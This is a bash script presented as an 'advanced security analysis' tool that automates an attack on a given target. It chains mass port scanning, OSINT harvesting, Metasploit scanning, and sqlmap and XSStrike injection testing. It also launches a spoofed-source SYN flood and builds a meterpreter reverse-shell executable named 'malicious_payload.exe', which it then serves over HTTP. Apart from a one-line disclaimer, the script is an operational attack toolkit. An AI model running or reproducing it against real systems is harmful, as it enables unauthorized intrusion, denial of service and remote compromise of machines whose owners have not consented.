#!/bin/bash

# ===============================
# Advanced Security Analysis Script
# ===============================
# WARNING: FOR LEGAL AND ETHICAL USE ONLY.
# Author: Security Professional

if [ -z "$1" ]; then
    echo "Usage: $0 <target-domain-or-ip>"
    exit 1
fi

TARGET=$1
DATE=$(date +"%Y-%m-%d_%H-%M-%S")
OUTPUT_DIR="advanced_scan_$TARGET_$DATE"

if [ "$EUID" -ne 0 ]; then
    echo "[!] Please run this script as root."
    exit 1
fi

mkdir -p $OUTPUT_DIR

TOOLS=("masscan" "nmap" "zmap" "metasploit-framework" "theHarvester" "spiderfoot" \
       "dnsenum" "hping3" "sqlmap" "xsstrike" "empire" "searchsploit")

for TOOL in "${TOOLS[@]}"; do
    if ! command -v $TOOL &>/dev/null; then
        echo "[!] Required tool '$TOOL' is not installed."
        exit 1
    fi
done

LOCAL_IP=$(hostname -I | awk '{print $1}')

# ===============================
# 1. Massive Port Scanning
# ===============================
echo "[*] Running Masscan for large-scale port scanning..."
masscan $TARGET -p1-65535 --rate=10000 -oL $OUTPUT_DIR/masscan_results.txt

PORTS=$(awk '/open/ {print $4}' $OUTPUT_DIR/masscan_results.txt | tr '\n' ',')
if [ -z "$PORTS" ]; then
    echo "[!] No open ports found. Skipping detailed Nmap scan."
else
    echo "[*] Running Nmap for detailed analysis..."
    nmap -A -p$PORTS -oN $OUTPUT_DIR/nmap_results.txt $TARGET
fi

# ===============================
# 2. Reconnaissance and OSINT
# ===============================
echo "[*] Collecting OSINT data..."
theHarvester -d $TARGET -b all -f $OUTPUT_DIR/theHarvester_results.html
spiderfoot-cli -s $TARGET -o $OUTPUT_DIR/spiderfoot_results.html
echo "[*] Extracting DNS information..."
dnsenum $TARGET > $OUTPUT_DIR/dnsenum_results.txt

# ===============================
# 3. Vulnerability Scanning
# ===============================
echo "[*] Running Metasploit vulnerability analysis..."
msfconsole -q -x "db_rebuild_cache; db_nmap -A $TARGET; vulns -o $OUTPUT_DIR/msf_vulns.txt; exit"

echo "[*] Searching CVE database for vulnerabilities..."
searchsploit $TARGET > $OUTPUT_DIR/searchsploit_results.txt

# ===============================
# 4. Firewall and IDS/IPS Analysis
# ===============================
echo "[*] Testing firewall rules..."
hping3 -S -p 80 -c 3 $TARGET > $OUTPUT_DIR/firewall_analysis.txt

echo "[*] Attempting evasion techniques..."
hping3 --flood --rand-source -S -p 80 $TARGET > $OUTPUT_DIR/firewall_bypass.log 2>&1 &
nmap -Pn -f --script=firewalk $TARGET > $OUTPUT_DIR/ids_ips_analysis.txt

# ===============================
# 5. Exploitation and Payload Delivery
# ===============================
echo "[*] Generating custom malware payload..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=4444 -f exe -o $OUTPUT_DIR/malicious_payload.exe

echo "[*] Hosting payload on HTTP server..."
python3 -m http.server 8080 --directory $OUTPUT_DIR &

# ===============================
# 6. XSS and SQL Injection Testing
# ===============================
echo "[*] Running SQLMap for SQL injection testing..."
sqlmap -u "http://$TARGET" --batch --crawl=3 --level=5 --output-dir=$OUTPUT_DIR/sqlmap_results

echo "[*] Running XSStrike for XSS testing..."
xsstrike -u "http://$TARGET" -o $OUTPUT_DIR/xsstrike_results.txt

# ===============================
# 7. Reporting
# ===============================
echo "[*] Generating detailed report..."
cat <<EOF > $OUTPUT_DIR/report.html
<html>
<head>
    <title>Advanced Security Report for $TARGET</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #333; }
        ul { list-style-type: none; padding: 0; }
        li { margin: 10px 0; }
        a { text-decoration: none; color: #007BFF; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <h1>Advanced Security Report for $TARGET</h1>
    <p><strong>Date:</strong> $DATE</p>
    <ul>
        <li><a href="masscan_results.txt">Masscan Results</a></li>
        <li><a href="nmap_results.txt">Nmap Results</a></li>
        <li><a href="theHarvester_results.html">theHarvester Results</a></li>
        <li><a href="spiderfoot_results.html">SpiderFoot Results</a></li>
        <li><a href="dnsenum_results.txt">DNS Analysis</a></li>
        <li><a href="msf_vulns.txt">Metasploit Vulnerability Results</a></li>
        <li><a href="searchsploit_results.txt">CVE Search Results</a></li>
        <li><a href="firewall_analysis.txt">Firewall Analysis</a></li>
        <li><a href="firewall_bypass.log">Firewall Bypass Logs</a></li>
        <li><a href="ids_ips_analysis.txt">IDS/IPS Analysis</a></li>
        <li><a href="malicious_payload.exe">Malicious Payload</a></li>
        <li><a href="sqlmap_results">SQLMap Results</a></li>
        <li><a href="xsstrike_results.txt">XSStrike Results</a></li>
    </ul>
</body>
</html>
EOF

echo "[*] Advanced analysis complete. Results saved in $OUTPUT_DIR."
